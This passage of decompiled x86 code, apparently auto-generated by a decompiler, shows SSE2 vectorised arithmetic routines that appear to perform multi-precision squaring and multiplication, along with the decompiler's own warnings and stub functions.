  v469 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v457, v457), _mm_loadl_epi64(&v660)), (__m128i)v468);
  v470 = (__m128i)_mm_movehl_ps(v468, v469);
  *(_DWORD *)(v471 + 168) = _mm_cvtsi128_si32((__m128i)v469);
  v472 = (__m128)_mm_add_epi32(v465, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v464, v467), v467), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v472);
  v473 = _mm_add_epi64(_mm_srli_epi64((__m128i)v469, 0x10u), (__m128i)v472);
  *(_QWORD *)(v471 + 170) = v473.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v473, 0x30u), v470).m128i_u64[0];
  v474 = _mm_load_si128(&v673);
  v475 = _mm_mul_epu32(_mm_load_si128(&v671), v474);
  v476 = _mm_load_si128(&stru_4BACE0);
  v477 = _mm_and_si128(v476, v475);
  v478 = _mm_srli_epi32(v475, 0x10u);
  v480 = _mm_mul_epu32(v474, *(__m128i *)(v479 - 16));
  sub_44B793();
  v481 = _mm_load_si128(&v672);
  v482 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v672.m128i_i8[8]), v481);
  v483 = _mm_mul_epu32(v481, v481);
  v484 = _mm_load_si128(&stru_4BACE0);
  v485 = _mm_add_epi32(_mm_and_si128(v476, v480), _mm_and_si128(v484, v482));
  v486 = _mm_add_epi32(_mm_srli_epi32(v480, 0x10u), _mm_srli_epi32(v482, 0x10u));
  v487 = _mm_add_epi32(v485, v485);
  v488 = _mm_add_epi32(v486, v486);
  v489 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v478, v478), _mm_srli_epi32(v483, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v490 = _mm_move_epi64(v487);
  v491 = _mm_move_epi64(v488);
  v492 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v487, v490), v490), 4);
  v493 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v477, v477), _mm_and_si128(v484, v483)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v492);
  v494 = (__m128i)_mm_movehl_ps(v492, v493);
  *(_DWORD *)(v495 + 176) = _mm_cvtsi128_si32((__m128i)v493);
  v496 = (__m128)_mm_add_epi32(v489, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v488, v491), v491), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v496);
  v497 = _mm_add_epi64(_mm_srli_epi64((__m128i)v493, 0x10u), (__m128i)v496);
  *(_QWORD *)(v495 + 178) = v497.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v497, 0x30u), v494).m128i_u64[0];
  v498 = _mm_load_si128(&v673);
  v499 = _mm_mul_epu32(_mm_load_si128(&v672), v498);
  v500 = _mm_load_si128(&stru_4BACE0);
  v501 = _mm_and_si128(v500, v499);
  v502 = _mm_srli_epi32(v499, 0x10u);
  v504 = _mm_mul_epu32(v498, *v503);
  v505 = _mm_and_si128(v500, v504);
  v506 = _mm_srli_epi32(v504, 0x10u);
  sub_44B793();
  v507 = _mm_add_epi32(v505, v505);
  v508 = _mm_add_epi32(v506, v506);
  v509 = _mm_add_epi32(_mm_add_epi32(v502, v502), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v510 = _mm_move_epi64(v507);
  v511 = _mm_move_epi64(v508);
  v512 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v507, v510), v510), 4);
  v513 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v501, v501), _mm_loadl_epi64(&v660)), (__m128i)v512);
  v514 = (__m128i)_mm_movehl_ps(v512, v513);
  *(_DWORD *)(v515 + 184) = _mm_cvtsi128_si32((__m128i)v513);
  v516 = (__m128)_mm_add_epi32(v509, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v508, v511), v511), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v516);
  v517 = _mm_add_epi64(_mm_srli_epi64((__m128i)v513, 0x10u), (__m128i)v516);
  *(_QWORD *)(v515 + 186) = v517.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v517, 0x30u), v514).m128i_u64[0];
  v518 = _mm_load_si128(&v674);
  v519 = _mm_mul_epu32(_mm_load_si128(&v672), v518);
  v520 = _mm_load_si128(&stru_4BACE0);
  v521 = _mm_and_si128(v520, v519);
  v522 = _mm_srli_epi32(v519, 0x10u);
  v524 = _mm_mul_epu32(v518, *(__m128i *)(v523 - 16));
  sub_44B7D0();
  v525 = _mm_load_si128(&v673);
  v526 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v673.m128i_i8[8]), v525);
  v527 = _mm_mul_epu32(v525, v525);
  v528 = _mm_load_si128(&stru_4BACE0);
  v529 = _mm_add_epi32(_mm_and_si128(v520, v524), _mm_and_si128(v528, v526));
  v530 = _mm_add_epi32(_mm_srli_epi32(v524, 0x10u), _mm_srli_epi32(v526, 0x10u));
  v531 = _mm_add_epi32(v529, v529);
  v532 = _mm_add_epi32(v530, v530);
  v533 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v522, v522), _mm_srli_epi32(v527, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v534 = _mm_move_epi64(v531);
  v535 = _mm_move_epi64(v532);
  v536 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v531, v534), v534), 4);
  v537 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v521, v521), _mm_and_si128(v528, v527)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v536);
  v538 = (__m128i)_mm_movehl_ps(v536, v537);
  *(_DWORD *)(v539 + 192) = _mm_cvtsi128_si32((__m128i)v537);
  v540 = (__m128)_mm_add_epi32(v533, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v532, v535), v535), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v540);
  v541 = _mm_add_epi64(_mm_srli_epi64((__m128i)v537, 0x10u), (__m128i)v540);
  *(_QWORD *)(v539 + 194) = v541.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v541, 0x30u), v538).m128i_u64[0];
  v542 = _mm_load_si128(&v674);
  v543 = _mm_mul_epu32(_mm_load_si128(&v673), v542);
  v544 = _mm_load_si128(&stru_4BACE0);
  v545 = _mm_and_si128(v544, v543);
  v546 = _mm_srli_epi32(v543, 0x10u);
  v548 = _mm_mul_epu32(v542, *v547);
  v549 = _mm_and_si128(v544, v548);
  v550 = _mm_srli_epi32(v548, 0x10u);
  sub_44B7D0();
  v551 = _mm_add_epi32(v549, v549);
  v552 = _mm_add_epi32(v550, v550);
  v553 = _mm_add_epi32(_mm_add_epi32(v546, v546), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v554 = _mm_move_epi64(v551);
  v555 = _mm_move_epi64(v552);
  v556 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v551, v554), v554), 4);
  v557 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v545, v545), _mm_loadl_epi64(&v660)), (__m128i)v556);
  v558 = (__m128i)_mm_movehl_ps(v556, v557);
  *(_DWORD *)(v559 + 200) = _mm_cvtsi128_si32((__m128i)v557);
  v560 = (__m128)_mm_add_epi32(v553, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v552, v555), v555), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v560);
  v561 = _mm_add_epi64(_mm_srli_epi64((__m128i)v557, 0x10u), (__m128i)v560);
  *(_QWORD *)(v559 + 202) = v561.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v561, 0x30u), v558).m128i_u64[0];
  v562 = _mm_load_si128(&v675);
  v563 = _mm_mul_epu32(_mm_load_si128(&v673), v562);
  v564 = _mm_load_si128(&stru_4BACE0);
  v565 = _mm_and_si128(v564, v563);
  v566 = _mm_srli_epi32(v563, 0x10u);
  v568 = _mm_mul_epu32(v562, *(__m128i *)(v567 - 16));
  sub_44B80D((int)&v674, &v674);
  v569 = _mm_load_si128(&v674);
  v570 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v674.m128i_i8[8]), v569);
  v571 = _mm_mul_epu32(v569, v569);
  v572 = _mm_load_si128(&stru_4BACE0);
  v573 = _mm_add_epi32(_mm_and_si128(v564, v568), _mm_and_si128(v572, v570));
  v574 = _mm_add_epi32(_mm_srli_epi32(v568, 0x10u), _mm_srli_epi32(v570, 0x10u));
  v575 = _mm_add_epi32(v573, v573);
  v576 = _mm_add_epi32(v574, v574);
  v577 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v566, v566), _mm_srli_epi32(v571, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v578 = _mm_move_epi64(v575);
  v579 = _mm_move_epi64(v576);
  v580 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v575, v578), v578), 4);
  v581 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v565, v565), _mm_and_si128(v572, v571)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v580);
  v582 = (__m128i)_mm_movehl_ps(v580, v581);
  *(_DWORD *)(v583 + 208) = _mm_cvtsi128_si32((__m128i)v581);
  v584 = (__m128)_mm_add_epi32(v577, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v576, v579), v579), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v584);
  v585 = _mm_add_epi64(_mm_srli_epi64((__m128i)v581, 0x10u), (__m128i)v584);
  *(_QWORD *)(v583 + 210) = v585.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v585, 0x30u), v582).m128i_u64[0];
  v586 = _mm_load_si128(&v675);
  v587 = _mm_mul_epu32(_mm_load_si128(&v674), v586);
  v588 = _mm_load_si128(&stru_4BACE0);
  v589 = _mm_and_si128(v588, v587);
  v590 = _mm_srli_epi32(v587, 0x10u);
  v592 = _mm_mul_epu32(v586, *v591);
  v593 = _mm_and_si128(v588, v592);
  v594 = _mm_srli_epi32(v592, 0x10u);
  sub_44B80D((int)&v675, &v674);
  v596 = _mm_add_epi32(v593, v593);
  v597 = _mm_add_epi32(v594, v594);
  v598 = _mm_add_epi32(_mm_add_epi32(v590, v590), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v599 = _mm_move_epi64(v596);
  v600 = _mm_move_epi64(v597);
  v601 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v596, v599), v599), 4);
  v602 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v589, v589), _mm_loadl_epi64(&v660)), (__m128i)v601);
  v603 = (__m128i)_mm_movehl_ps(v601, v602);
  *(_DWORD *)(v604 + 216) = _mm_cvtsi128_si32((__m128i)v602);
  v605 = (__m128)_mm_add_epi32(v598, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v597, v600), v600), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v605);
  v606 = _mm_add_epi64(_mm_srli_epi64((__m128i)v602, 0x10u), (__m128i)v605);
  *(_QWORD *)(v604 + 218) = v606.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v606, 0x30u), v603).m128i_u64[0];
  v607 = _mm_load_si128(&v676);
  v608 = _mm_mul_epu32(_mm_load_si128(&v674), v607);
  v609 = _mm_load_si128(&stru_4BACE0);
  v610 = _mm_and_si128(v609, v608);
  v611 = _mm_srli_epi32(v608, 0x10u);
  v613 = _mm_mul_epu32(v607, v612[-1]);
  v614 = _mm_load_si128(&v675);
  v615 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v675.m128i_i8[8]), v614);
  v616 = _mm_mul_epu32(v614, v614);
  v617 = v609;
  v618 = _mm_add_epi32(_mm_and_si128(v609, v613), _mm_and_si128(v609, v615));
  v619 = _mm_add_epi32(_mm_srli_epi32(v613, 0x10u), _mm_srli_epi32(v615, 0x10u));
  v620 = _mm_add_epi32(v618, v618);
  v621 = _mm_add_epi32(v619, v619);
  v622 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v611, v611), _mm_srli_epi32(v616, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v623 = _mm_move_epi64(v620);
  v624 = _mm_move_epi64(v621);
  v625 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v620, v623), v623), 4);
  v626 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v610, v610), _mm_and_si128(v617, v616)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v625);
  v627 = (__m128i)_mm_movehl_ps(v625, v626);
  *(_DWORD *)(v604 + 224) = _mm_cvtsi128_si32((__m128i)v626);
  v628 = (__m128)_mm_add_epi32(v622, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v621, v624), v624), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v628);
  v629 = _mm_add_epi64(_mm_srli_epi64((__m128i)v626, 0x10u), (__m128i)v628);
  *(_QWORD *)(v604 + 226) = v629.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v629, 0x30u), v627).m128i_u64[0];
  ++v612;
  v630 = _mm_load_si128(&v676);
  v631 = _mm_mul_epu32(_mm_load_si128(&v675), v630);
  v632 = _mm_load_si128(&stru_4BACE0);
  v633 = _mm_and_si128(v632, v631);
  v634 = _mm_srli_epi32(v631, 0x10u);
  v635 = _mm_mul_epu32(v630, v612[-1]);
  v636 = _mm_and_si128(v632, v635);
  v637 = _mm_srli_epi32(v635, 0x10u);
  v638 = _mm_add_epi32(v636, v636);
  v639 = _mm_add_epi32(v637, v637);
  v640 = _mm_move_epi64(v638);
  v641 = _mm_move_epi64(v639);
  v642 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v633, v633), _mm_loadl_epi64(&v660)),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v638, v640), v640), 4));
  v643 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v634, v634), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8])),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v639, v641), v641), 4));
  *(_DWORD *)(v604 + 232) = _mm_cvtsi128_si32(v642);
  v644 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v642), 0x10u), _mm_move_epi64(v643));
  v645 = _mm_unpackhi_epi64(v643, v640);
  *(_QWORD *)(v604 + 234) = v644.m128i_i64[0];
  v646 = _mm_add_epi32(_mm_unpackhi_epi64(v642, v640), _mm_srli_epi64(v644, 0x30u));
  v647 = _mm_load_si128(&v676);
  v648 = _mm_mul_epu32(v647, v647);
  v649 = _mm_mul_epu32(v647, *v612);
  v650 = _mm_load_si128(&stru_4BACE0);
  v651 = _mm_and_si128(v650, v648);
  v652 = _mm_add_epi32(v645, _mm_srli_epi32(v648, 0x10u));
  v653 = _mm_and_si128(v650, v649);
  v654 = _mm_srli_epi32(v649, 0x10u);
  v655 = _mm_move_epi64(v653);
  v656 = _mm_move_epi64(v654);
  v657 = _mm_add_epi32(
           _mm_add_epi32(v646, v651),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v653, v655), v655), 4));
  v658 = _mm_add_epi32(v652, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v654, v656), v656), 4));
  *(_DWORD *)(v604 + 240) = _mm_cvtsi128_si32(v657);
  v659 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v657), 0x10u), _mm_move_epi64(v658));
  *(_QWORD *)(v604 + 242) = v659.m128i_i64[0];
  *(_QWORD *)(v604 + 248) = _mm_add_epi64(
                              _mm_add_epi32(_mm_unpackhi_epi64(v657, v655), _mm_srli_epi64(v659, 0x30u)),
                              _mm_slli_epi64(_mm_unpackhi_epi64(v658, v655), 0x10u)).m128i_u64[0];
  return result;
}
// 44BAB1: variable 'v75' is possibly undefined
// 44BAFE: variable 'v83' is possibly undefined
// 44BB99: variable 'v99' is possibly undefined
// 44BBE9: variable 'v107' is possibly undefined
// 44BC49: variable 'v119' is possibly undefined
// 44BC96: variable 'v127' is possibly undefined
// 44BD31: variable 'v143' is possibly undefined
// 44BD81: variable 'v151' is possibly undefined
// 44BDE1: variable 'v163' is possibly undefined
// 44BE2E: variable 'v171' is possibly undefined
// 44BEC9: variable 'v187' is possibly undefined
// 44BF19: variable 'v195' is possibly undefined
// 44BF79: variable 'v207' is possibly undefined
// 44BFC6: variable 'v215' is possibly undefined
// 44C061: variable 'v231' is possibly undefined
// 44C0B1: variable 'v239' is possibly undefined
// 44C111: variable 'v251' is possibly undefined
// 44C15E: variable 'v259' is possibly undefined
// 44C1F9: variable 'v275' is possibly undefined
// 44C249: variable 'v283' is possibly undefined
// 44C2A9: variable 'v295' is possibly undefined
// 44C2F6: variable 'v303' is possibly undefined
// 44C391: variable 'v319' is possibly undefined
// 44C3E1: variable 'v327' is possibly undefined
// 44C441: variable 'v339' is possibly undefined
// 44C48E: variable 'v347' is possibly undefined
// 44C529: variable 'v363' is possibly undefined
// 44C57F: variable 'v371' is possibly undefined
// 44C5DF: variable 'v383' is possibly undefined
// 44C632: variable 'v391' is possibly undefined
// 44C6CD: variable 'v407' is possibly undefined
// 44C723: variable 'v415' is possibly undefined
// 44C783: variable 'v427' is possibly undefined
// 44C7D6: variable 'v435' is possibly undefined
// 44C871: variable 'v451' is possibly undefined
// 44C8C7: variable 'v459' is possibly undefined
// 44C927: variable 'v471' is possibly undefined
// 44C97A: variable 'v479' is possibly undefined
// 44CA15: variable 'v495' is possibly undefined
// 44CA6B: variable 'v503' is possibly undefined
// 44CACB: variable 'v515' is possibly undefined
// 44CB1E: variable 'v523' is possibly undefined
// 44CBB9: variable 'v539' is possibly undefined
// 44CC0F: variable 'v547' is possibly undefined
// 44CC6F: variable 'v559' is possibly undefined
// 44CCC2: variable 'v567' is possibly undefined
// 44CD5D: variable 'v583' is possibly undefined
// 44CDB3: variable 'v591' is possibly undefined
// 44CE13: variable 'v604' is possibly undefined
// 44CE66: variable 'v612' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;

//----- (0044B69C) --------------------------------------------------------
int sub_44B69C()
{
  return sub_44B6DC();
}
// 44B6DC: using guessed type int sub_44B6DC(void);

//----- (0044B6DC) --------------------------------------------------------
int sub_44B6DC()
{
  return sub_44B719();
}
// 44B719: using guessed type int sub_44B719(void);

//----- (0044B719) --------------------------------------------------------
int sub_44B719()
{
  return sub_44B756();
}
// 44B756: using guessed type int sub_44B756(void);

//----- (0044B756) --------------------------------------------------------
int sub_44B756()
{
  return sub_44B793();
}
// 44B793: using guessed type int sub_44B793(void);

//----- (0044B793) --------------------------------------------------------
int sub_44B793()
{
  return sub_44B7D0();
}
// 44B7D0: using guessed type int sub_44B7D0(void);

//----- (0044B7D0) --------------------------------------------------------
int sub_44B7D0()
{
  return sub_44B80D();
}
// 44B80D: using guessed type int sub_44B80D(void);

//----- (0044B80D) --------------------------------------------------------
__m128i __usercall sub_44B80D@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 32)), _mm_load_si128(a2 + 2)), 0x10u);
}

//----- (0044D090) --------------------------------------------------------
int __cdecl sub_44D090(int a1, int a2)
{
  int result; // eax
  int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm7
  __m128i v7; // xmm5
  __m128i si128; // xmm6
  __m128i v9; // xmm4
  __m128i v10; // xmm7
  __m128i v11; // xmm6
  __m128i v12; // xmm7
  __m128i v13; // xmm0
  __m128i v14; // xmm1
  __m128 v15; // xmm6
  __m128 v16; // xmm4
  __m128i v17; // xmm6
  __m128 v18; // xmm5
  __m128i v19; // xmm4
  __m128i v20; // xmm7
  __m128i v21; // xmm5
  __m128i v22; // xmm6
  __m128i v23; // xmm4
  __m128i v24; // xmm5
  __m128i v25; // xmm7
  __m128i v26; // xmm6
  __m128i v27; // xmm7
  __m128i v28; // xmm6
  __m128i v29; // xmm7
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128i v32; // xmm4
  __m128i v33; // xmm5
  __m128i v34; // xmm6
  __m128i v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm0
  __m128i v39; // xmm7
  __m128i v40; // xmm6
  __m128i v41; // xmm2
  __m128i v42; // xmm5
  __m128i v43; // xmm6
  __m128i v44; // xmm7
  __m128i v45; // xmm0
  __m128i v46; // xmm1
  __m128i v47; // xmm4
  __m128i v48; // xmm5
  __m128i v49; // xmm6
  __m128i v50; // [esp+0h] [ebp-5Ch] BYREF
  __m128i v51; // [esp+10h] [ebp-4Ch] BYREF
  __m128i v52; // [esp+20h] [ebp-3Ch] BYREF
  __m128i v53; // [esp+30h] [ebp-2Ch]
  __m128i v54; // [esp+40h] [ebp-1Ch]

  result = a2;
  for ( i = 0; i != 16; i += 16 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i), 141);
    *(__m128i *)((char *)&v51 + 2 * i) = v4;
    *(__m128i *)((char *)&v51 + 2 * i + 16) = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v53 + 2 * i) = v5;
    *(__m128i *)((char *)&v54 + 2 * i) = _mm_srli_epi64(v5, 0x20u);
  }
  v6 = _mm_load_si128(&v51);
  v7 = _mm_mul_epu32(v6, v6);
  si128 = _mm_load_si128(&stru_4BACE0);
  v9 = _mm_and_si128(si128, v7);
  v10 = _mm_mul_epu32(v6, v53);
  v11 = _mm_and_si128(si128, v10);
  v12 = _mm_srli_epi32(v10, 0x10u);
  v13 = _mm_move_epi64(v11);
  v14 = _mm_move_epi64(v12);
  v15 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v11, v13), v13), 4);
  v16 = (__m128)_mm_add_epi32(v9, (__m128i)v15);
  v17 = (__m128i)_mm_movehl_ps(v15, v16);
  *(_DWORD *)a1 = _mm_cvtsi128_si32((__m128i)v16);
  v18 = (__m128)_mm_add_epi32(
                  _mm_srli_epi32(v7, 0x10u),
                  _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v12, v14), v14), 4));
  _mm_storeh_ps((double *)&v50.m128i_i64[1], v18);
  v19 = _mm_add_epi64(_mm_srli_epi64((__m128i)v16, 0x10u), (__m128i)v18);
  *(_QWORD *)(a1 + 2) = v19.m128i_i64[0];
  v50.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v19, 0x30u), v17).m128i_u64[0];
  v20 = _mm_load_si128(&v52);
  v21 = _mm_mul_epu32(_mm_load_si128(&v51), v20);
  v22 = _mm_load_si128(&stru_4BACE0);
  v23 = _mm_and_si128(v22, v21);
  v24 = _mm_srli_epi32(v21, 0x10u);
  v25 = _mm_mul_epu32(v20, v53);
  v26 = _mm_and_si128(v22, v25);
  v27 = _mm_srli_epi32(v25, 0x10u);
  v28 = _mm_add_epi32(v26, v26);
  v29 = _mm_add_epi32(v27, v27);
  v30 = _mm_move_epi64(v28);
  v31 = _mm_move_epi64(v29);
  v32 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v23, v23), _mm_loadl_epi64(&v50)),
          _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v28, v30), v30), 4));
  v33 = _mm_add_epi32(
          _mm_add_epi32(_mm_add_epi32(v24, v24), _mm_loadl_epi64((const __m128i *)&v50.m128i_i8[8])),
          _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v29, v31), v31), 4));
  *(_DWORD *)(a1 + 8) = _mm_cvtsi128_si32(v32);
  v34 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v32), 0x10u), _mm_move_epi64(v33));
  v35 = _mm_unpackhi_epi64(v33, v30);
  *(_QWORD *)(a1 + 10) = v34.m128i_i64[0];
  v36 = _mm_add_epi32(_mm_unpackhi_epi64(v32, v30), _mm_srli_epi64(v34, 0x30u));
  v37 = _mm_load_si128(&v52);
  v38 = _mm_mul_epu32(v37, v37);
  v39 = _mm_mul_epu32(v37, v54);
  v40 = _mm_load_si128(&stru_4BACE0);
  v41 = _mm_and_si128(v40, v38);
  v42 = _mm_add_epi32(v35, _mm_srli_epi32(v38, 0x10u));
  v43 = _mm_and_si128(v40, v39);
  v44 = _mm_srli_epi32(v39, 0x10u);
  v45 = _mm_move_epi64(v43);
  v46 = _mm_move_epi64(v44);
  v47 = _mm_add_epi32(_mm_add_epi32(v36, v41), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v43, v45), v45), 4));
  v48 = _mm_add_epi32(v42, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v44, v46), v46), 4));
  *(_DWORD *)(a1 + 16) = _mm_cvtsi128_si32(v47);
  v49 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v47), 0x10u), _mm_move_epi64(v48));
  *(_QWORD *)(a1 + 18) = v49.m128i_i64[0];
  *(_QWORD *)(a1 + 24) = _mm_add_epi64(
                           _mm_add_epi32(_mm_unpackhi_epi64(v47, v45), _mm_srli_epi64(v49, 0x30u)),
                           _mm_slli_epi64(_mm_unpackhi_epi64(v48, v45), 0x10u)).m128i_u64[0];
  return result;
}
// 4BACE0: using guessed type __m128i stru_4BACE0;

//----- (0044D2C0) --------------------------------------------------------
int __cdecl sub_44D2C0(int a1, int a2)
{
  unsigned int i; // edx
  __m128i v3; // xmm0
  __m128i v4; // xmm1
  __m128i v5; // xmm7
  __m128i v6; // xmm5
  __m128i si128; // xmm6
  __m128i v8; // xmm4
  __m128i v9; // xmm7
  __m128i v10; // xmm6
  __m128i v11; // xmm7
  __m128i v12; // xmm0
  __m128i v13; // xmm1
  __m128 v14; // xmm6
  __m128 v15; // xmm4
  __m128i v16; // xmm6
  __m128 v17; // xmm5
  __m128i v18; // xmm4
  __m128i v19; // xmm7
  __m128i v20; // xmm5
  __m128i v21; // xmm6
  __m128i v22; // xmm4
  __m128i v23; // xmm5
  __m128i v24; // xmm7
  __m128i v25; // xmm6
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm5
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128 v32; // xmm6
  __m128 v33; // xmm4
  __m128i v34; // xmm6
  __m128 v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm5
  __m128i v39; // xmm6
  __m128i v40; // xmm4
  __m128i v41; // xmm5
  __m128i v42; // xmm7
  __m128i v43; // xmm3
  __m128i v44; // xmm1
  __m128i v45; // xmm3
  __m128i v46; // xmm2
  __m128i v47; // xmm6
  __m128i v48; // xmm7
  __m128i v49; // xmm6
  __m128i v50; // xmm7
  __m128i v51; // xmm5
  __m128i v52; // xmm0
  __m128i v53; // xmm1
  __m128 v54; // xmm6
  __m128 v55; // xmm4
  __m128i v56; // xmm6
  __m128 v57; // xmm5
  __m128i v58; // xmm4
  __m128i v59; // xmm7
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm4
  __m128i v63; // xmm5
  __m128i v64; // xmm7
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  int result; // eax
  __m128i v68; // xmm6
  __m128i v69; // xmm7
  __m128i v70; // xmm5
  __m128i v71; // xmm0
  __m128i v72; // xmm1
  __m128 v73; // xmm6
  __m128 v74; // xmm4
  __m128i v75; // xmm6
  int v76; // ecx
  __m128 v77; // xmm5
  __m128i v78; // xmm4
  __m128i v79; // xmm7
  __m128i v80; // xmm5
  __m128i v81; // xmm6
  __m128i v82; // xmm4
  __m128i v83; // xmm5
  __m128i *v84; // edx
  __m128i v85; // xmm7
  __m128i v86; // xmm3
  __m128i v87; // xmm1
  __m128i v88; // xmm3
  __m128i v89; // xmm2
  __m128i v90; // xmm6
  __m128i v91; // xmm7
  __m128i v92; // xmm6
  __m128i v93; // xmm7
  __m128i v94; // xmm5
  __m128i v95; // xmm0
  __m128i v96; // xmm1
  __m128 v97; // xmm6
  __m128 v98; // xmm4
  __m128i v99; // xmm6
  __m128 v100; // xmm5
  __m128i v101; // xmm4
  __m128i v102; // xmm7
  __m128i v103; // xmm5
  __m128i v104; // xmm6
  __m128i v105; // xmm4
  __m128i v106; // xmm5
  __m128i v107; // xmm7
  __m128i v108; // xmm6
  __m128i v109; // xmm7
  __m128i v110; // xmm6
  __m128i v111; // xmm7
  __m128i v112; // xmm0
  __m128i v113; // xmm1
  __m128i v114; // xmm4
  __m128i v115; // xmm5
  __m128i v116; // xmm6
  __m128i v117; // xmm5
  __m128i v118; // xmm4
  __m128i v119; // xmm7
  __m128i v120; // xmm0
  __m128i v121; // xmm7
  __m128i v122; // xmm6
  __m128i v123; // xmm2
  __m128i v124; // xmm5
  __m128i v125; // xmm6
  __m128i v126; // xmm7
  __m128i v127; // xmm0
  __m128i v128; // xmm1
  __m128i v129; // xmm4
